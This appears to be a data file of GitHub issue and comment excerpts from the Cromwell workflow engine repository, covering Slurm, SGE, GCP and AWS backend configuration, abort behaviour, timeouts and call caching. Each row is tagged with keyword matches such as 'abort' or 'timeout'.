Safety,"HPC; # Singularity+Slurm: and an example on Slurm; # udocker: another rootless container solution; # udocker+slurm: also exemplified on slurm; # HtCondor: workload manager at UW-Madison; # LSF: the Platform Load Sharing Facility backend; # SGE: Sun Grid Engine; # SLURM: workload manager. # Note that these other backend examples will need tweaking and configuration.; # Please open an issue https://www.github.com/broadinstitute/cromwell if you have any questions; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; # Root directory where Cromwell writes job results in the container. This value; # can be used to specify where the execution folder is mounted in the container.; # it is used for the construction of the docker_cwd string in the submit-docker; # value above.; dockerRoot = ""/cromwell-executions"". concurrent-job-limit = 10; # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; ## Warning: If set, Cromwell will run 'check-alive' for every job at this interval; exit-code-timeout-seconds = 360; filesystems {; local {; localization: [; # soft link does not work for docker with --contain. Hard links won't work; # across file systems; ""copy"", ""hard-link"", ""soft-link""; ]; caching {; duplication-strategy: [""copy"", ""hard-link"", ""soft-link""]; hashing-strategy: ""file""; }; }; }. #; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 3; Int requested_memory_mb_per_core = 8000; Int memory_mb = 40000; String? docker; String? partition; String? account; String? IMAGE; """""". submit = """"""; sbatch \; --wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${out} \; --error=${err} \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""/b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:6590,timeout,timeout-seconds,6590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['timeout'],['timeout-seconds']
Safety,Have Workflow Actor call Abort to Lifecycle Actors,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/671:25,Abort,Abort,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/671,1,['Abort'],['Abort']
Safety,"Hello I am trying to re-use an existing workflow for Mutect2 available here: https://app.terra.bio/#workspaces/terra-outreach/CHIP-Detection-Mutect2 to run on SLURM with Singularity configuration. There are multiple steps similar to Mutect2 public workflow available here: https://github.com/broadinstitute/gatk/blob/master/scripts/mutect2_wdl/mutect2.wdl , but still attaching the modified WDL with additional steps. . So when we run this with the given configuration using the following; export SINGULARITY_CACHEDIR=$PWD/singularity_cache; export SINGULARITY_TMPDIR=$PWD/tmpdir; module load singularity; rm -rf nohup.out && nohup java -Dconfig.file=$PWD/cromwell_singularity.conf -jar $PWD/cromwell-84.jar run $PWD/mutect2_modified.wdl --inputs $PWD/inputs.json &. The issue is that the first step of splitting intervals runs fine, but as it starts mutect2, it starts copying of the complete execution directory making here is the directory structure. cromwell-executions/; └── Mutect2; └── e5769b79-5e02-44a5-a4f8-38745e152beb; ├── call-M2; │ └── shard-0; │ ├── execution; │ └── inputs; │ ├── -1816294717; │ ├── 1855713868; │ │ └── run_cromwell_only.tmp; │ │ └── cromwell-executions; │ │ └── Mutect2; │ │ └── e5769b79-5e02-44a5-a4f8-38745e152beb; │ ├── 2035192126; │ └── 891763929; └── call-SplitIntervals; ├── execution; │ ├── glob-0fc990c5ca95eebc97c4c204e3e303e1; │ └── interval-files; ├── inputs; │ └── -1816294717; └── tmp.c9d96672. As you can see that run_cromwell_only.tmp is being made and that happens to fall in an endless loop and eventually, it errors stating the file name is too long to copy. Can you help me how to avoid this behavior of making circular paths when copying files for execution? Also, note it does not happen in the first step of SplitIntervals but happens in the Mutect2 call. [mutect2_gatk.wdl.txt](https://github.com/broadinstitute/cromwell/files/9813528/mutect2_gatk.wdl.txt); [cromwell_singularity.conf.txt](https://github.com/broadinstitute/cromwell/files/981352",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6934:131,Detect,Detection-,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6934,1,['Detect'],['Detection-']
Safety,"Hello, I am running Cromwell 36 configured with the GCS/JES backend to run jobs on GCP. When running massive batches of workflows, I frequently encounter the IP-address quota from Google. To avoid this, I've reconfigured my default VPC to allow private google access (see #1325). I've added the following to my Cromwell configuration (other unrelated configuration entries removed):; ```; backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; default-runtime-attributes {; noAddress: true; }; }; }; }; }; ```. This appears to have the desired effect, as my instances are now launching without an external IP, however, the jobs end up failing because docker cannot fetch the image `stedolan/jq` (as it resides on docker hub). Is there a way to configure Cromwell to use a different image for that pipeline action?. I could reconfigure the VPC to allow access to docker(hub), but that would require connecting a NAT instance which would increase the cost of using Cromwell. ---. Edit: Cromwell 36. Sorry!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676:191,avoid,avoid,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676,1,['avoid'],['avoid']
Safety,"Here's a log for a similar workflow that had the same issue but recovered after restart. ```; 2017-02-13 16:50:09,104 INFO - MaterializeWorkflowDescriptorActor [UUID(3d01da76)]: Call-to-Backend assignments: test.hello -> JES; 2017-02-13 16:50:09,534 INFO - JES [UUID(3d01da76)]: Creating authentication file for workflow 3d01da76-98f9-4751-a3c0-efc61ef67030 at ; gs://cromwell-auth-broad-dsde-alpha/3d01da76-98f9-4751-a3c0-efc61ef67030_auth.json; 2017-02-13 16:50:10,063 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Starting calls: test.hello:NA:1; 2017-02-13 16:50:11,006 INFO - JesRun [UUID(3d01da76)test.hello:NA:1]: JES Run ID is operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:11,006 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: job id: operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:16,621 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from - to Initializing; 2017-02-13 16:51:01,890 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Initializing to Running; 2017-02-13 16:51:38,243 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; 2017-02-13 16:51:38,977 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; }; 2017-02-13 16:51:39,178 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953:64,recover,recovered,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953,1,['recover'],['recovered']
Safety,"Hey @antonkulaga, these aren't exactly what you're after but there are two things you could have a look at that should help:; - You can use the `concurrent-job-limit` for the local backend to limit how many jobs (i.e. calls being run) are happening at any given time. That should cause things to slow down naturally without having to manually pause/resume them, which might help. In the config:; ```; backend {; ...; providers {; BackendName {; actor-factory = ...; config {; concurrent-job-limit = 5; ```. - The second item (not re-running early tasks) should be helped by [call caching](https://github.com/broadinstitute/cromwell#call-caching). As long as nothing changes in the intermediate steps, Cromwell should be able to detect and re-use your previous results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527:728,detect,detect,728,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2023#issuecomment-283395527,2,['detect'],['detect']
Safety,"Hey @gauravs90 - this looks like it shares a bit of work with the stuff I did in my #707 PR, trying to get message processing as far through the system as possible without backends. Luckily, you've focused in a different place (the actual validation) so combining/merging them shouldn't be too tough. The big differences I can see:; - I did the Materialization in a shadow actor to avoid interrupting the main one; - I moved backend assignment into my ShadowMaterializeWorkflowDescriptorActor; - MaterializeWorkflowDescriptorActor creates a data-only EngineWorkflowDescriptor. Literally just a BackendWorkflowDescriptor plus backend assignments. Having looked at your code though, I'm now unsure which is better; - It turned out I wasn't 100% correct first time so there was a lot of tidying up in the interfaces between the lifecycle states :-/ . Anyway, I've added you as a reviewer on my PR so you can have a look at what I've done - it'd be nice to try to work out where these things should go and maybe rebase or merge these PRs since they're making changes in similar places?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658:382,avoid,avoid,382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/709#issuecomment-210438658,1,['avoid'],['avoid']
Safety,Hey @patmagee -- a few questions:. 1. What version of Cromwell are you using? Is this behavior you're seeing as of recently? ; 2. Are you using the abort endpoint or killing operations from the Google Cloud console?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395992525:148,abort,abort,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395992525,1,['abort'],['abort']
Safety,"Hey @patmagee I'm able to reproduce this behavior today. We will look into why this is happening, there's a definitely some path that's not killing jobs upon abort.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628025:158,abort,abort,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628025,1,['abort'],['abort']
Safety,"Hey @rhpvorderman, that worked great for a bit so thanks for the comment! . I sometimes seem to be getting timeouts on smaller databases (300 seconds for a 2GB file), I think this might be due to Cromwell terminating incorrectly and it not starting up again. I'm following the SQLite with fingers crossed, and if there's anything I can do I'm more than happy to help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629961081:107,timeout,timeouts,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629961081,1,['timeout'],['timeouts']
Safety,Hey @ruchim . I am using 31.1. And i aborted them with the rest endpoint first. But a day later vms were still running. Manually killing these caused the above behaviour,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395998956:37,abort,aborted,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-395998956,1,['abort'],['aborted']
Safety,"Hey @samanehsan . Can you please explain what happens when you try and abort an on-hold workflow, what happens?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4311#issuecomment-433184701:71,abort,abort,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4311#issuecomment-433184701,1,['abort'],['abort']
Safety,"Hey Conrad - Thanks, this is awesome. To give some insight on how things are playing out in the hopefully-not-too-long-term, we're planning on cutting an alpha release of the PBE stuff imminently (perhaps today?) which is something we feel is stable enough to start poking at but is missing a few features we need in our production use cases (restart/recovery, call caching), backends other than local/JES, and with some known warts we need to hammer out. I'm guessing you're looking at roughly a month for something more stable than that, although I'm famous for my ""about a month"" predictions. However, since you're already pretty up to speed with what's going on, I'd say that the 0.20 alpha should be stable enough to work up a backend. It'd at least be a good test case as someone who _did_ figure out how to make one in the old system if the new system is inscrutable or not. In terms of what to do with this PR, I'll somewhat leave it up to you. We're hoping to close the 0.19 books as much as possible once the alpha thing is out, but if you feel like it'll provide value to folks over the next month or so I'm happy to take some time to review it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-229977813:351,recover,recovery,351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-229977813,2,"['predict', 'recover']","['predictions', 'recovery']"
Safety,"Hey Patrick, I just ran a tiny test and was able to confirm jobs getting aborted. ; - How many jobs were started from your workflow, and did any of the jobs from your workflow abort?; - Do you have a general sense at the stage your jobs were on when they were aborted? Were they all mostly executing the command when you aborted them? ; - Did Cromwell ever report the workflow to have been successfully Aborted? Any errors thrown in the server logs?. Would you mind posting the operation metadata from one of the jobs that you tried aborting using the rest endpoint? Or simply the events reported for that operation?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-396002673:73,abort,aborted,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-396002673,11,"['Abort', 'abort']","['Aborted', 'abort', 'aborted', 'aborting']"
Safety,"Hey, not part of the Cromwell team but thought I'd try to help out. To clarify, you've:; - Built a Docker container with SGE + mysql; - Where `qsub` is not available through your `$PATH`, but installed at `/opt/gridengine/bin/lx-amd64/qsub`; - A (_virtual?_) SGE cluster is running within the container; - Running Cromwell inside this container; - Asking the cluster inside your docker container to spin up another Docker container. If this is correct, I'm struggling to understand the motivations behind it, but a few pointers:. - What does intermittent errors mean?; - You should avoid running Docker-in-Docker (SO: [Is it ok to run docker from inside docker?](https://stackoverflow.com/questions/27879713/is-it-ok-to-run-docker-from-inside-docker)); - It might be more predictable add `qsub` to the docker's path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5334#issuecomment-571316484:582,avoid,avoid,582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5334#issuecomment-571316484,2,"['avoid', 'predict']","['avoid', 'predictable']"
Safety,"Hi @EvanTheB could you check something for me - you should be seeing a message like `Cromwell will watch for an rc file *and* double-check every {} seconds to make sure this job is still alive` when you start your job? (assuming `INFO` level logging is enabled). Then, with that background polling ongoing throughout the job run, if a full iteration of `exit-poll-timeout` has passed since the job stopped running, Cromwell will then mark the job as failed. If that gives you enough to put something more helpful into the docs that would be awesome! If not, I can maybe clarify a bit more? Otherwise we should hopefully be able to cycle round to improving this documentation _eventually_ (though unfortunately I can't make any stronger promises on an ETA than that!)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-485806172:364,timeout,timeout,364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-485806172,1,['timeout'],['timeout']
Safety,"Hi @TMiguelT, I worked on relative imports in Cromwell quite recently. The ideas about specifying the ""start point"" within the zip file did come up, but in the end people seemed more interested in relative HTTP imports (which is what I focussed on). I have two potential ideas for you which hopefully don't need Cromwell code changes. Hopefully these will help you - if not let us know!. ## Submit by URL. If you have a new version of Cromwell - since these changes were relatively recent - then you could try submitting the workflow to Cromwell by URL (based on your relative path, I'd guess the github hosted location you want would be https://raw.githubusercontent.com/h3abionet/h3agatk/1.0.1/workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl). ## Call into the relatively nested file. If submit by URL is out, you could perhaps make a top level ""wrapper"" workflow which immediately imports and calls `workflows/GATK/GATK-complete-WES-Workflow-h3abionet.cwl`. This should let you access it while keeping it's location relative to the other files in the repo safe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212:1067,safe,safe,1067,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4505#issuecomment-449025212,1,['safe'],['safe']
Safety,"Hi @aednichols , ; Sorry for the long delay in response. This PR definitely fixes an issue that we found running Cromwell in AWS (see my description [above](https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-543478047)). . I don't know if this scenario is covered in the existing tests. I had a quick look at the CI build and it looks to me as if the AWS CI Job is failing due to a job timeout, rather than actual tests failing. The last line in the log is:; > The job exceeded the maximum time limit for jobs, and has been terminated. The other successful jobs have the test results summary and an overall success message. Can you adjust the CI settings & run it again to see what the results are?. If this scenario is not actually covered by the existing tests, do I need to add an integration test in order to have the PR merged?. thanks; Ben",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-563012170:401,timeout,timeout,401,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-563012170,1,['timeout'],['timeout']
Safety,"Hi @cjllanwarne, thanks for the response! Actually, my examples passed validation by `wdltool`, but I justed tested them with the current version of `womtool` and they did not pass the validation, and the errors are meaningful. I think it's safe to dismiss the bug label now.; ```Unable to build WOM node for Scatter '$scatter_0': Unable to build WOM node for WdlTaskCall 'testtask': Cannot build expression for 'Test_optional.testtask.str = strings1[idx]': Invalid indexing target. You cannot index a value of type 'Array[String]?'```. ```Unable to build WOM node for Declaration 'num': Cannot build expression for 'Test_optional.num = length(strings1)': Unexpected arguments to function `length`. `length` takes a parameter of type Array but got: Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType)))```. ```Unable to build WOM node for Declaration 'string_pair': Cannot build expression for 'Test_optional.string_pair = zip(strings1, strings2)': Unexpected zip parameters: Vector(Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))), Success(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))))```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555:241,safe,safe,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428632555,1,['safe'],['safe']
Safety,"Hi @dgtester, thanks for this! . A few tidbits after a quick scan:; - In general Future is preferred over a raw Thread just because it plays nicer in the scala ecosystem; - Despite the fact that we do exactly this in a few places (bad us), you're really not supposed to be blocking on threads inside of actors - it has the potential to really gum up the works.; - The actor already has a notion of an internal state (NotRunning, Done, etc) that you should be able to leverage here. For instance (and I'm really making this up as I go along, so it's entirely likely to be not a good idea) you could have an Aborting state and when in that state it's waiting for the signal that currently is triggering the mutation on isDone",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173733834:606,Abort,Aborting,606,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173733834,1,['Abort'],['Aborting']
Safety,Hi @drkennetz - this seems quite similar in intent to an existing (opt-in) option for checking exit-code timeouts (https://cromwell.readthedocs.io/en/develop/backends/HPC/#exit-code-timeout). Since the timeout function would catch all failures (eg even if the script doesn't get a chance to trap the signal) I suspect it's more generally useful. What do you think?. cc @EvanTheB and @rhpvorderman since they probably know at least as much about why we went down the `exit-code-timeout` route as I do... 😄,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5107#issuecomment-519602956:105,timeout,timeouts,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5107#issuecomment-519602956,4,['timeout'],"['timeout', 'timeouts']"
Safety,"Hi @ffinfo would you might rolling back the `RetryAbortedJobs` changes and submitting them again as a separate PR? . I suspect that you're conflating `abort` as something external vs `abort` as something that Cromwell does itself (eg from a REST request or while it's shutting itself down) - and we need to be careful to get all of those interactions right - especially if this affects other backends. In any case, I think it's worth having it properly reviewed as its own change (rather than having it delay an otherwise approved PR 😄).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-427009938:151,abort,abort,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-427009938,2,['abort'],['abort']
Safety,"Hi @ffinfo. I originally thought this was going to be a patch to just lower the rc polling verbosity, but you've begun tackling a much bigger issue. Thanks a bunch for your work so far!. We've also got a bunch of other work we're juggling at the moment, so it's unlikely I or others on the team will have time to look at this issue of disappearing SGE jobs in depth for at least a couple weeks. For now, here's a brain dump of notes. After a short bit of review, I'd perhaps try a different approach.; - On execute or recover, `scheduleOnce` a message back to `self` to later check if a job is alive.; - When the message is received check if the job is alive.; - If the job is alive `scheduleOnce` a message to check if the job is alive again.; - If the job is not alive write an rc file with `143` (or other code, see notes on configuration below).; - An instance of `cromwell.core.retry.Backoff` should travel inside the scheduled messages. Each time the message is to be scheduled, get the next time. As for the existing code, here are a few notes.; - Use `java.time` instead of `java.util`. `java.time.Instant` and `java.time.Duration` may be used to calculate the amount of time between two instants.; - `IsAliveCash.cash` should be `.cache`.; - `.map(_.cache).getOrElse(true)` should be `.forall(_.cache)`, however...; - `.cache` always appears to be `true`, and thus not needed.; - `!isAliveCache.contains` followed by `isAliveCache.get` should be `isAliveCache.getOrElseUpdate(job, IsAliveCache(Instant.now))`.; - There should be only one `SharedFileSystemJob` per `SharedFileSystemAsyncJobExecutionActor`. The reason the values are passed around is because the actor is also partially stateless, using `context.become` to track the `SharedFileSystemJob`. This PR adds state more to the actor, outside of the context, but that shouldn't be needed if the `isAlive` check is switched to running due to multiple `scheduleOnce` calls. The tests are likely timing out because the of the extra check",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238:518,recover,recover,518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-243562238,2,['recover'],['recover']
Safety,"Hi @jjackzhn, this is really more of a WDL question than a Cromwell question (and if you'd like to change how this works, there is an active community managing the WDL spec [here](https://github.com/openwdl/wdl)). In the meantime, you can convert any `X?` into a non-optional `X` by using `select_first` ([see docs](https://github.com/openwdl/wdl/blob/master/versions/1.0/SPEC.md#x-select_firstarrayx)). Here's your `scatter` example modified to include `select_first`:. ```wdl; Array[String]? strings. # Put 'strings' into an Array[Array[String]?] with one entry: [strings1]; # Then, select the first value in that array which is defined.; # (Note: the workflow will fail if strings is not defined!); Array[String] strings_not_optional = select_first([strings1]). scatter (str in strings_not_optional) { ; call testtask{ input: str = str }; }; ```. If you want to be safe in case the value is not supplied, you can wrap that into an `if`, but note that the output will also be optional now:. ```wdl; Array[String]? strings. if (defined(strings)) {; Array[String] strings_not_optional = select_first([strings1]). scatter (str in strings_not_optional) { ; call testtask{ input: str = str }; }; }. output {; # Let's imagine that testtask has a ""String out_string""; # Because it's wrapped in an 'if', it's now an optional output:; String? out_string = testtask.out_string; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428327738:868,safe,safe,868,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428327738,1,['safe'],['safe']
Safety,"Hi @katevoss I'm getting the same or very similar behaviour, running Cromwell 36. A job running on SGE finished at 18:55 but Cromwell didn't detect that it had finished until 9:50 the next morning. I could see the `rc` file in there with return code `0` while Cromwell still reported the job as `Running`. . This is a single, very low resource, 5 minute job, which runs right after a large (10k) scatter - don't know if that's really relevant though. It has happened twice in a row now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-444077848:141,detect,detect,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-444077848,1,['detect'],['detect']
Safety,"Hi @mr-c -> I believe this is because we pin our cwl checkout (as we use `schema-salad`) to a known commit to avoid instability from changing conformance tests and at some point it looks like the tests there require a newer version of `schema-salad` - let me know if you're interpreting this differently (I'm not an expert on things `pip`):. ```; pkg_resources.ContextualVersionConflict: (schema-salad 2.7.20180501211602 (/var/lib/jenkins/workspace/cromwell/venv/lib/python2.7/site-packages), Requirement.parse('schema-salad<3,>=2.7.20180719125426'), set(['cwltool'])); ```. If we can be guaranteed that new tests will **always** be append-only we could remove that pin which should make problems like this go away going forward. FWIW we treat [our travis](https://travis-ci.org/broadinstitute/cromwell/jobs/412681578) as our canonical check (which of course is different from **your** canonical check).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3973#issuecomment-410804918:110,avoid,avoid,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3973#issuecomment-410804918,1,['avoid'],['avoid']
Safety,"Hi Guys,. This is more of a question/request than a bug report. Apologies if this is not the place to ask. Im trying to run Cromwell with an AWS backend. A number of our workflows make extensive use of very large reference files. To avoid localising the same huge file over and over (wasting time and space) I want to copy these reference files to an additional volume during batch node initialisation and mount to each container (rather than using File arguments I would use a simple String argument to prevent localisation - I appreciate this is a hack). I am already doing this with a different pipeline framework with some success, however it requires the JobDefinition to specify the mount locations between the node(host) and job container. Is it possible to provide additional mount/volume instructions to the aws batch backend in the cromwell.conf?. If this is possible, I cannot see any specific examples in the Cromwell docs. If this is not currently possible, could I request adding the ability to define additional mount points as a feature request??. Kind Regards,; Jon",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6334:233,avoid,avoid,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334,1,['avoid'],['avoid']
Safety,"Hi Guys. We are running pipelines through Cromwell on AWS Batch using S3 and have noticed some behaviour we didn't initially expect. We have a task that has quite a significant setup cost. As such we want to process a number of samples through this task rather than instantiating the task for every sample. We can then parallelise this task to process batches of samples. The task takes an Array of structs:. ```; struct Sample {; String id; File file1; File file2; }; ```. The struct is serialised to the task using write_json() and the tool consumes the resulting json before processing the samples one after the other. It is important that the output files can be matched back to their original inputs via the supplied id. The tool outputs a single file per sample to a directory and produces a reports.json that looks like:. ```; [; {; ""id"": ""1""; ""file"": ""outputs/report.txt""; },; ...; ]; ```. I was hoping we could use the read_json() function to parse the output.json into an array of the following struct:. ```; struct Report {; String id; File file; }; ```. and pass this to the next task (or drive a scatter) in the pipeline. However, the File objects parsed in this manner are not resolved to actual task outputs and neither have their address updated or delocalised at the end of the task. Conceptually, it seems like resolving Files within read_* generated structs would be handled the same way as raw File outputs. However, looking at how the delocalisation occurs in the Cromwell task script I understand why this would be difficult to implement. The wdl spec dose not specifically state that File outputs generated this way will be respected but then again it does not say that they won't. a) Could I put forward a feature request for the spec to detect File outputs generated from read_* functions and delocalise them?; b) Or put a note in the wdl/Cromwell spec that File objects generated from read_*() functions may not be detected in the output?. Thanks,; Jon",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6795:1762,detect,detect,1762,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6795,2,['detect'],"['detect', 'detected']"
Safety,"Hi Jon,. This isn't directly supported right now. You could change the; CloudFormation template so that your customized mount is mounted to the EC2; nodes. It is also possible to mount EFS directly into an AWS Batch; container through the job definition but that would require changes in; Cromwell's AWS Batch backend. Using EFS with containers for Cromwell; workflows is something we are investigating but there are some stress tests; that we need to do at scale to see if sufficient IOPs are available. On Wed, May 5, 2021 at 11:29 AM microbioticajon ***@***.***>; wrote:. > Hi Guys,; >; > This is more of a question/request than a bug report. Apologies if this is; > not the place to ask.; >; > Im trying to run Cromwell with an AWS backend. A number of our workflows; > make extensive use of very large reference files. To avoid localising the; > same huge file over and over (wasting time and space) I want to copy these; > reference files to an additional volume during batch node initialisation; > and mount to each container (rather than using File arguments I would use a; > simple String argument to prevent localisation - I appreciate this is a; > hack). I am already doing this with a different pipeline framework with; > some success, however it requires the JobDefinition to specify the mount; > locations between the node(host) and job container; >; > Is it possible to provide additional mount/volume instructions to the aws; > batch backend in the cromwell.conf?; >; > If this is possible, I cannot see any specific examples in the Cromwell; > docs. If this is not currently possible, could I request adding the ability; > to define additional mount points as a feature request??; >; > Kind Regards,; > Jon; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6334>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EI7XBOPHMWSYW3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484:827,avoid,avoid,827,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919302484,2,['avoid'],['avoid']
